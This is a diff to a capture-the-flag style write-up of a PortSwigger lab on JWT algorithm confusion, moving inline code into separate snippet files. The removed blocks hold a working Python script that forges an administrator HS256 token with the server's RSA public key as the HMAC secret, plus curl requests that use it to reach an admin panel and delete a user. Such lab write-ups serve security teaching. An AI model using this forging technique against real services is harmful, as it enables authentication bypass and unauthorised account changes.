@@ -10,6 +10,7 @@ lang: "en"
 
 import CollapsiblePartial from '../../components/CollapsiblePartial.astro';
 import PartialContainer from '../../components/PartialContainer.astro';
+import CodeSnippet from '../../components/CodeSnippet.astro';
 
 ## Necessary Background Concepts To Solve The Lab
 
@@ -22,9 +23,7 @@ import PartialContainer from '../../components/PartialContainer.astro';
 
 The lab hints that the server exposes its public key via a standard endpoint. Let's grab it:
 
-```bash
-curl -s "https://<lab-url>.web-security-academy.net/jwks.json" | jq . | cat
-```
+<CodeSnippet file="jwt-authentication-bypass-via-algorithm-confusion/01-bash.sh" />
 
 > **Command breakdown**: \
 `-s` = silent mode (no progress meter) \
@@ -33,45 +32,21 @@ curl -s "https://<lab-url>.web-security-academy.net/jwks.json" | jq . | cat
 
 Response:
 
-```json
-{
-  "keys": [
-    {
-      "kty": "RSA",
-      "e": "AQAB",
-      "use": "sig",
-      "kid": "66a4de73-4f3b-4bc3-af9e-913726ff79e9",
-      "alg": "RS256",
-      "n": "sj2oHajSBloFiMQ4ibb4AoQpVjAr1IGfauqD45TOcby2CDAFZi7zJwN9TzXrR0RzBGCrGZ688GB3GsuaO-3JkQOMwgazq-j_8vFBuVqqnUXUb3q5tjGsAcMU4FCDlt_y-NqZZOHFBEPfdRBrcOWqa8iiSHi-Any6XC_CRgThyRMLumedBZx8Ql0qX0O0_3ONvapVfv5d1NZIz4Ub1tKrd6ZfctGL3MDfy6MVnqfjUd0A_1dNGO7dtaZjpPX9XETySBFyJtaSna9UtvBA1uiEn2YQ7LpQL5HAonfEAHWQ6RU6326xbAHH9zi2e_xfAd7utO1qBh-q_F0u0wcakpIPeQ"
-    }
-  ]
-}
-```
+<CodeSnippet file="jwt-authentication-bypass-via-algorithm-confusion/02-json.json" />
 
 The server uses **RS256** (RSA-SHA256), an asymmetric algorithm. The public key is fully exposed. This is the key ingredient for the algorithm confusion attack.
 
 Now let's log in to get a valid JWT session token:
 
-```bash
-curl -s "https://<lab-url>.web-security-academy.net/login" | grep -A 5 csrf
-```
+<CodeSnippet file="jwt-authentication-bypass-via-algorithm-confusion/03-bash.sh" />
 
 > **Command breakdown**: \
 `-s` = silent mode (no progress meter) \
 `grep -A 5 csrf` = show lines containing "csrf" and 5 lines after (to see the full login form)
 
-```html
-<input required type="hidden" name="csrf" value="boKHZUigeTMwAPoj22PxRk44IWCeuNBL">
-<label>Username</label>
-<input required type=username name="username" autofocus>
-<label>Password</label>
-<input required type=password name="password">
-<button class=button type=submit> Log in </button>
-```
+<CodeSnippet file="jwt-authentication-bypass-via-algorithm-confusion/04-html.html" />
 
-```bash
-curl -D - "https://<lab-url>.web-security-academy.net/login" -d "csrf=boKHZUigeTMwAPoj22PxRk44IWCeuNBL&username=wiener&password=peter"
-```
+<CodeSnippet file="jwt-authentication-bypass-via-algorithm-confusion/05-bash.sh" />
 
 > **Command breakdown**: \
 `-D -` = dump response headers to stdout \
@@ -79,93 +54,27 @@ curl -D - "https://<lab-url>.web-security-academy.net/login" -d "csrf=boKHZUigeT
 
 Response:
 
-```
-HTTP/2 302 
-location: /my-account?id=wiener
-set-cookie: session=eyJraWQiOiI2NmE0ZGU3My00ZjNiLTRiYzMtYWY5ZS05MTM3MjZmZjc5ZTkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQyOTkzNywic3ViIjoid2llbmVyIn0.mY9e1sSEUFUkVXwt1RZhNaVTZz_d8iID7VKXSA84VCB1ZeMXKv-vq6D3oD52RMSsK_u65ZAnm0jioylxe6SB1k-VrmT3zCK_ECOXENtHLRsHqOA8lGs_cbLRfACBuOXdsrrEFqTYyGLbcTdEYAxkPOQAeCJvzdH6wloScHTPKcR1AY9UgFscFvAHixB5idR6_fe7MgnZP7-IyN28--CybyxcwMKFAL1FfE9u81fNkx-Qa3bGJZGqRXuYreIzpBbk95ijPADOIual0MpJspyJ5996IoNr4gHy34EmsOqH6xJFvLLrWlvHNyLupnwLHmvGIX-Jrg3Iw3PI9IwdhWngOQ; Secure; HttpOnly; SameSite=None
-```
+<CodeSnippet file="jwt-authentication-bypass-via-algorithm-confusion/06-plain.http" />
 
 Let's decode the JWT to understand its structure:
 
-```bash
-echo "eyJraWQiOiI2NmE0ZGU3My00ZjNiLTRiYzMtYWY5ZS05MTM3MjZmZjc5ZTkiLCJhbGciOiJSUzI1NiJ9" | base64 -d | jq . | cat
-```
+<CodeSnippet file="jwt-authentication-bypass-via-algorithm-confusion/07-bash.sh" />
 
 Header output:
 
-```json
-{
-  "kid": "66a4de73-4f3b-4bc3-af9e-913726ff79e9",
-  "alg": "RS256"
-}
-```
+<CodeSnippet file="jwt-authentication-bypass-via-algorithm-confusion/08-json.json" />
 
-```bash
-echo "eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQyOTkzNywic3ViIjoid2llbmVyIn0" | base64 -d | jq .
-```
+<CodeSnippet file="jwt-authentication-bypass-via-algorithm-confusion/09-bash.sh" />
 
 Payload output:
 
-```json
-{
-  "iss": "portswigger",
-  "exp": 1773429937,
-  "sub": "wiener"
-}
-```
+<CodeSnippet file="jwt-authentication-bypass-via-algorithm-confusion/10-json.json" />
 
 The JWT uses **RS256** and the server exposes its public key at `/jwks.json`. This is a textbook setup for an **algorithm confusion attack**: we switch `alg` to HS256 and sign the token using the RSA public key (in PEM format) as the HMAC symmetric secret. The server will verify using its "public key" as if it were an HMAC secret, and our signature will match.
 
 The attack requires converting the JWK to X.509 PEM format first (the lab hint confirms the server stores its key as PEM). Let's write a Python script that does the full exploit:
 
-```python
-import base64, hmac, hashlib
-from cryptography.hazmat.primitives import serialization
-from cryptography.hazmat.primitives.asymmetric import rsa
-
-# JWK from /jwks.json
-jwk = {
-  "kty": "RSA",
-  "e": "AQAB",
-  "use": "sig",
-  "kid": "66a4de73-4f3b-4bc3-af9e-913726ff79e9",
-  "alg": "RS256",
-  "n": "sj2oHajSBloFiMQ4ibb4AoQpVjAr1IGfauqD45TOcby2CDAFZi7zJwN9TzXrR0RzBGCrGZ688GB3GsuaO-3JkQOMwgazq-j_8vFBuVqqnUXUb3q5tjGsAcMU4FCDlt_y-NqZZOHFBEPfdRBrcOWqa8iiSHi-Any6XC_CRgThyRMLumedBZx8Ql0qX0O0_3ONvapVfv5d1NZIz4Ub1tKrd6ZfctGL3MDfy6MVnqfjUd0A_1dNGO7dtaZjpPX9XETySBFyJtaSna9UtvBA1uiEn2YQ7LpQL5HAonfEAHWQ6RU6326xbAHH9zi2e_xfAd7utO1qBh-q_F0u0wcakpIPeQ"
-}
-
-def b64url_decode(s): return base64.urlsafe_b64decode(s + '=' * (4 - len(s) % 4))
-def b64url_encode(data): return base64.urlsafe_b64encode(data).decode().rstrip('=')
-
-# Convert JWK to RSA public key
-modulus = int.from_bytes(b64url_decode(jwk['n']), 'big')
-exponent = int.from_bytes(b64url_decode(jwk['e']), 'big')
-
-public_key = rsa.RSAPublicNumbers(exponent, modulus).public_key()
-
-# Get PEM format
-pem = public_key.public_bytes(
-  encoding=serialization.Encoding.PEM,
-  format=serialization.PublicFormat.SubjectPublicKeyInfo
-)
-
-print("Extracted PEM public key:")
-print(pem.decode())
-
-# Forge JWT with alg=HS256
-header = '{"kid":"66a4de73-4f3b-4bc3-af9e-913726ff79e9","alg":"HS256"}'
-# Also set sub=administrator
-payload = '{"iss":"portswigger","exp":1773429937,"sub":"administrator"}'
-
-message = f"{b64url_encode(header.encode())}.{b64url_encode(payload.encode())}"
-
-# Sign with HMAC-SHA256 using the PEM public key as the secret
-signature = b64url_encode(hmac.new(pem, message.encode(), hashlib.sha256).digest())
-
-forged_jwt = f"{message}.{signature}"
-
-print("\nForged JWT:")
-print(forged_jwt)
-```
+<CodeSnippet file="jwt-authentication-bypass-via-algorithm-confusion/11-python.py" />
 
 > **Script breakdown**: \
 > The script performs a JWT algorithm confusion attack by:
@@ -176,29 +85,11 @@ print(forged_jwt)
 
 Expected output:
 
-```
-Extracted PEM public key:
------BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsj2oHajSBloFiMQ4ibb4
-AoQpVjAr1IGfauqD45TOcby2CDAFZi7zJwN9TzXrR0RzBGCrGZ688GB3GsuaO+3J
-kQOMwgazq+j/8vFBuVqqnUXUb3q5tjGsAcMU4FCDlt/y+NqZZOHFBEPfdRBrcOWq
-a8iiSHi+Any6XC/CRgThyRMLumedBZx8Ql0qX0O0/3ONvapVfv5d1NZIz4Ub1tKr
-d6ZfctGL3MDfy6MVnqfjUd0A/1dNGO7dtaZjpPX9XETySBFyJtaSna9UtvBA1uiE
-n2YQ7LpQL5HAonfEAHWQ6RU6326xbAHH9zi2e/xfAd7utO1qBh+q/F0u0wcakpIP
-eQIDAQAB
------END PUBLIC KEY-----
-
-Forged JWT:
-eyJraWQiOiI2NmE0ZGU3My00ZjNiLTRiYzMtYWY5ZS05MTM3MjZmZjc5ZTkiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQyOTkzNywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.E8mcBwAiA4NqHpbxGyq9lWwHXak7oZjKztwJcTagv7E
-```
+<CodeSnippet file="jwt-authentication-bypass-via-algorithm-confusion/12-plain.txt" />
 
 Now let's access the admin panel with our forged JWT:
 
-```bash
-curl -s "https://<lab-url>.web-security-academy.net/admin" \
-  -b "session=eyJraWQiOiI2NmE0ZGU3My00ZjNiLTRiYzMtYWY5ZS05MTM3MjZmZjc5ZTkiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQyOTkzNywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.E8mcBwAiA4NqHpbxGyq9lWwHXak7oZjKztwJcTagv7E" \
-  | grep "carlos"
-```
+<CodeSnippet file="jwt-authentication-bypass-via-algorithm-confusion/13-bash.sh" />
 
 > **Command breakdown**: \
 `-b "session=..."` = send the forged JWT as a session cookie \
@@ -206,17 +97,11 @@ curl -s "https://<lab-url>.web-security-academy.net/admin" \
 
 Response:
 
-```html
-<span>carlos - </span>
-<a href="/admin/delete?username=carlos">Delete</a>
-```
+<CodeSnippet file="jwt-authentication-bypass-via-algorithm-confusion/14-html.html" />
 
 We have admin access. Now let's delete the user carlos:
 
-```bash
-curl -s "https://<lab-url>.web-security-academy.net/admin/delete?username=carlos" \
-  -b "session=eyJraWQiOiI2NmE0ZGU3My00ZjNiLTRiYzMtYWY5ZS05MTM3MjZmZjc5ZTkiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQyOTkzNywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.E8mcBwAiA4NqHpbxGyq9lWwHXak7oZjKztwJcTagv7E"
-```
+<CodeSnippet file="jwt-authentication-bypass-via-algorithm-confusion/15-bash.sh" />
 
 The algorithm confusion attack let us **weaponize the server's own public key against itself**, turning its verification mechanism into our signing tool and fulminating carlos with the very key meant to protect him.
 
